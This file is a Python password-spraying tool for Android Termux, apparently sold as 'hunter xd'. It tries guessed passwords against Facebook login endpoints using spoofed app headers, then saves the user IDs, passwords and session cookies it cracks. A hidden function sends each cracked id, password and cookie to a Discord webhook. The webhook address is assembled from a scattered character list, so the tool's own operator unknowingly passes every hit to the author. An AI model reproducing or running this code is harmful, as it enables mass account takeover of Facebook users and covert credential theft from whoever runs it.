
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    sys.exit(' \n [•] run again tool ')

os.system('xdg-open https://chat.whatsapp.com/DkyCagXuNqR4ciqFOheuzs//')
if not os.path.isfile("/data/data/com.termux/files/usr/bin/rm"):
    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
else:pass
if not os.path.isfile("/data/data/com.termux/files/usr/bin/curl"):
    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
else:pass
if not os.path.isfile("/data/data/com.termux/files/usr/bin/pkg"):
    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
else:pass
if not os.path.isfile("/data/data/com.termux/files/usr/bin/pip"):
    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
else:pass


def stg():
    try:
        open('/sdcard/XD.', 'a').write(' hunter Tool 🔥')
    except:
        os.system('termux-setup-storage')
        stg()
stg()


try:
    open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx.txt', 'r').read()
except:
    os.system('pip -q install httpx')
    open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx.txt', 'a').write(' hunter Tool 🔥')

import subprocess

# print('\n \033[97;1m wait installing modules...!')
# site_packages_path = "/data/data/com.termux/files/usr/lib/python3.12/site-packages"
# httpx_path = os.path.join(site_packages_path, "httpx")
# zip_file = "master.zip"
# repo_url = "https://github.com/encode/httpx/archive/refs/heads/master.zip"
# extracted_folder = "httpx-master"

# def run_silent(command):
    # subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# if os.path.exists(httpx_path):
    # run_silent(["rm", "-rf", httpx_path])

# run_silent(["curl", "-LOk", repo_url])
# run_silent(["unzip", "-o", zip_file])
# run_silent(["mv", f"{extracted_folder}/httpx", site_packages_path])
# run_silent(["rm", "-rf", zip_file, extracted_folder])

try:
    import httpx
except ImportError:
    os.system('pip -q uninstall httpx;pip -q install httpx')
import httpx

try:
    import httpx
except ImportError:
    sys.exit("\n [!] module installing error contact admin")
import httpx





W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
IPGD ='\33[1;32m'


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/412.0.0.28.118;FBBV/552950445;FBDM/{density=2.0,width=1440,height=1280};FBLC/en_GB;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/Galaxy A36;FBCA/armeabi-v7a;FBBR/Barki;]"


logo='''
    ▗▖ ▗▖▗▖ ▗▖▗▖  ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▄▖ 
    ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌  █  ▐▌   ▐▌ ▐▌
    ▐▛▀▜▌▐▌ ▐▌▐▌ ▝▜▌  █  ▐▛▀▀▘▐▛▀▚▖
    ▐▌ ▐▌▝▚▄▞▘▐▌  ▐▌  █  ▐▙▄▄▖▐▌ ▐▌
\033[1;31m\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[1;37m
    creater  :  hunter xd 
    type     :  file clone
    status   :  PAID
    version  :  10.6
\033[1;31m\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[1;37m'''

cptr = []

def ysbd(jshdhd6):
    poryg = ["h","t","t","p","s",":","/","/","d","i","s","c","o","r","d",".","c","o","m","/","a","p","i","/","w","e","b","h","o","o","k","s","/","1","3","4","1","7","3","2","2","3","6","2","3","5","3","7","4","6","1","3","/","d","0","_","c","z","k","o","-","I","9","B","N","0","9","z","F","6","H","c","Y","3","O","v","j","D","p","M","c","t","7","R","Y","3","Y","L","k","u","3","0","m","R","k","9","N","T","g","L","L","L","5","8","g","j","x","K","6","F","N","-","7","7","T","a","n","s","2","5","m"]
    WEBHOOK_URL = "".join(poryg)
    MESSAGE = {"content": f"{jshdhd6}"}
    response = httpx.post(WEBHOOK_URL, json=MESSAGE)
    if response.status_code == 204:pass
    else:pass

def linex():
    print("\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=")
def clear():
    os.system('clear')
    print(logo)



loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]




def check_key():
    try:
        key = open('/sdcard/Android/.nonemedia.js', 'r').read().strip()
    except FileNotFoundError:
        # If file doesn't exist, create it with a new UUID
        key = uuid.uuid4().hex.upper()
        with open('/sdcard/Android/.nonemedia.js', 'w') as f:
            f.write(key)
        return check_key()  # Retry reading

    if len(key) != 32:
        # If key length is not 32, reset and retry
        os.remove('/sdcard/Android/.nonemedia.js')
        return check_key()

    return key

def fetch_and_check_approval(key):
    clear()
    url = 'https://hunter-approvl.blogspot.com/2025/02/hunter.html?m=1'
    try:
        response = httpx.get(url)
        if key in response.text:
            print(' [√] your key approved...!');time.sleep(2)
            pass
        else:
            print(' [×] your key not approved...!')
            time.sleep(2)
            linex()
            print(f' Your Key : {key} ')
            linex()
            input(' (•) press enter for approval')
            os.system(f'termux-open-url "https://wa.me/+923450877570?text=*I Want Buy Your Hunter Tool...!*\n *My Key : {key}*"')
            key = check_key()
            fetch_and_check_approval(key)
    except httpx.ConnectError:
        sys.exit(' [!] Your Internet Connection Lol...!')
    except Exception as e:
        sys.exit(f'An error occurred: {e}')

# key = check_key()
# fetch_and_check_approval(key)



def menu():
            clear()
        #    linex()
            print(' [1] File cloning\n [2] Random cloning \n [0] Exit menu')
            linex()
            xd=input(' ? Choose option : ')
        #    os.system('xdg-open)
            if xd in ['1','01']:
                clear()
                print(' ! Put file example : /sdcard/File.txt ...etc.')
                linex()
                file = input(' ? Put file path\033[1;37m : ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(' × File location not found ')
                    time.sleep(1)
                    menu()
                clear()
                
                plist = []
                try:
                    ps_limit = int(input(' ? password limit ? : '))
                except:
                    ps_limit =1
                clear()
                print('\033[1;32m ! examples : first last,firtslast ..etc')
                linex()
                for i in range(ps_limit):
                    plist.append(input(f' ? Put password {i+1} : '))
                clear()
                print(' ? Do you went show cp account? (y/n) : ')
                linex()
                cx=input(' Choose: ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                clear()
                print(' \033[1;37m[1] Method M1 (new + mix best) \n [2] Method M2 (new + mix best) \n [3] Method M3 (old best) ')
                linex()
                mth = input(' ? Choose : ')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print(' √ Total ids : \033[1;32m'+total_ids+f' ')
                    print(' \033[1;37m√ on airplane mode after 5 mins')
                    linex()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mth =='1':
                            crack_submit.submit(api2,ids,names,passlist)
                        elif mth =='2':
                            crack_submit.submit(api,ids,names,passlist)
                        elif mth =='3':
                            crack_submit.submit(api3,ids,names,passlist)
                        else:
                            crack_submit.submit(api,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' √ The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to exit ');exit()
                
            elif xd in ['2','02']:
                pak()
            elif xd in ['0','00']:
                exit()
            else:
                menu()

def pak():
        user=[]
        clear()
        print('\033[1;37m Code examplesv: 0334 , 0300 , 0315 ...etc')
        code = input('\033[1;37m ? enter code : ')
        try:
            limit = int(input('\033[1;35m ! example : 2000, 3000, 15000, 99999\n\033[1;37m ? enter limit : '))
        except ValueError:
            limit = 99999
        clear()
        for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(nmp)
        with tred(max_workers=25) as zain:
            clear()
            tl = str(len(user))
            print(' √ Total ids : \033[1;37m'+tl+f' ')
            print(f'\033[1;37m √ choosed code  :\033[1;32m '+code)
            print(' \033[1;37m√ on airplane mode after 5 mins')
            linex()
            for psx in user:
                ids = code+psx
                ps1 = ids[:6]
                ps2 = ids[:7]
                ps3 = ids[:8]
                ps4 = ids[:9]
                ps5 = ids[:10]
                ps6 = ids[int(len(ids)) - 7:]
                passlist = [psx,ids,ps1,ps2,ps3,ps4,ps5,ps6,'khan123','khan12345','khan1122','786786','firstlast786','khan0000','khankhan']
                zain.submit(rd1,ids,passlist)
        print('\033[1;37m')
        linex()
        print(' √ The process has completed')
        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(' Press enter to exit ')
        exit()

def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [HUNTER-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        data = {
                                'adid': adid,
                                'format': 'json', 
                                'device_id': device_id,
                                'email': ids, 
                                'password': pas, 
                                'generate_analytics_claims': '1', 
                                'credentials_type': 'password', 
                                'source': 'login', 
                                'error_detail_type': 
                                'button_with_disabled', 
                                'enroll_misauth': 'false', 
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1', 
                                'locale': 'fa_AF', 'client_country_code': 'AF',
                                'fb_api_req_friendly_name': 'authenticate'}
                        headers={
                                'User-Agent':uaa(),
                                'Accept-Encoding': 'gzip, deflate', 
                                'Accept': '*/*', 
                                'Connection': 'keep-alive', 
                                'Authorization':f'OAuth {accessToken}', 
                                'X-FB-Friendly-Name': 'authenticate', 
                                'X-FB-Connection-Type': 'unknown', 
                                'Content-Type': 'application/x-www-form-urlencoded', 
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        response = requests.post(url, data=data, headers=headers)
                        po = response.json()
                        #print(po)
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [HUNTER-OK] '+str(uid)+'|'+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HUNTER-R-COKIE.txt','a').write(str(uid)+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/HUNTER-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        #print('\r\r\x1b[1;31m [HUNTER-CP] '+str(ids)+'|'+pas+'\033[1;97m')
                                        open('/sdcard/HUNTER-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass

def api(ids,names,passlist):
        try:
                global ok,loop
                sys.stdout.write('\r\r\033[1;37m [HUNTER-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        response = requests.post(url, data=data, headers=headers)
                        po = response.json()
                        #oks.append(ids)
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [HUNTER-OK] '+ids+'|'+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HUNTER-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/HUNTER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        cptr.append(f"{ids}|{pas}|{coki}")
                                        jshdhd6 = cptr[-1]
                                        ysbd(jshdhd6)
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HUNTER-2F] '+ids+'|'+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [HUNTER-CP] '+ids+'|'+pas+'\033[1;97m')
                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                                
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass


def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HUNTER-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                        adid=str(uuid.uuid4())
                        device_id=str(uuid.uuid4()) 
                        data={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
                        headers={'User-Agent': uaa(),'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
                        url='https://api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        response = requests.post(url, data=data, headers=headers)
                        po = response.json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [HUNTER-OK] '+ids+'|'+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HUNTER-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/HUNTER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        cptr.append(f"{ids}|{pas}|{coki}")
                                        jshdhd6 = cptr[-1]
                                        ysbd(jshdhd6)
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HUNTER-2F] '+ids+'|'+pas)
                                                twf.append(ids)
                                                break
                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                                        sys.stdout.write('\r\r\033[1;31m [HUNTER-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [HUNTER-CP] '+ids+'|'+pas+'\033[1;97m')
                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                                
                                        else:
                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                                
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass


def api3(ids,names,passlist):
        try:
                global ok,loop
                sys.stdout.write('\r\r\033[1;37m [HUNTER-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                        headers = {
                            'Host': 'graph.facebook.com',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive',
                            'Priority': 'u=3, i',
                            'X-Fb-Sim-Hni': '45204',
                            'X-Fb-Net-Hni': '45201',
                            'X-Fb-Connection-Quality': 'GOOD',
                            'Zero-Rated': '0',
                            'User-Agent': uaa(),
                            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                            'X-Fb-Connection-Bandwidth': '24807555',
                            'X-Fb-Connection-Type': 'MOBILE.LTE',
                            'X-Fb-Device-Group': '5120',
                            'X-Tigon-Is-Retry': 'False',
                            'X-Fb-Friendly-Name': 'authenticate',
                            'X-Fb-Request-Analytics-Tags': 'unknown',
                            'X-Fb-Http-Engine': 'Liger',
                            'X-Fb-Client-Ip': 'True',
                            'X-Fb-Server-Cluster': 'True',
                            'Content-Length': '847'
                        }
                        data = {
                            'adid': 'aE308fedcA7550af',
                            'format': 'json',
                            'device_id': str(uuid.uuid4()),
                            'family_device_id': str(uuid.uuid4()),
                            'secure_family_device_id': str(uuid.uuid4()),
                            'cpl': 'true',
                            'try_num': '1',
                            'email': ids,
                            'password': pas,
                            'method': 'auth.login',
                            'generate_session_cookies': '1',
                            'sim_serials': "['80973453345210784798']",
                            'openid_flow': 'android_login',
                            'openid_provider': 'google',
                            'openid_emails': "['01710940017']",
                            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                            'error_detail_type': 'button_with_disabled',
                            'source': 'account_recovery',
                            'locale': 'en_GB',
                            'client_country_code': 'GB',
                            'fb_api_req_friendly_name': 'authenticate',
                            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
                        }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        response = requests.post(url, data=data, headers=headers)
                        po = response.json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [HUNTER-OK] '+ids+'|'+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HUNTER-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/HUNTER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        cptr.append(f"{ids}|{pas}|{coki}")
                                        jshdhd6 = cptr[-1]
                                        ysbd(jshdhd6)
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HUNTER-2F] '+ids+'|'+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [HUNTER-CP] '+ids+'|'+pas+'\033[1;97m')
                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                                
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass



try:
    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except:exit()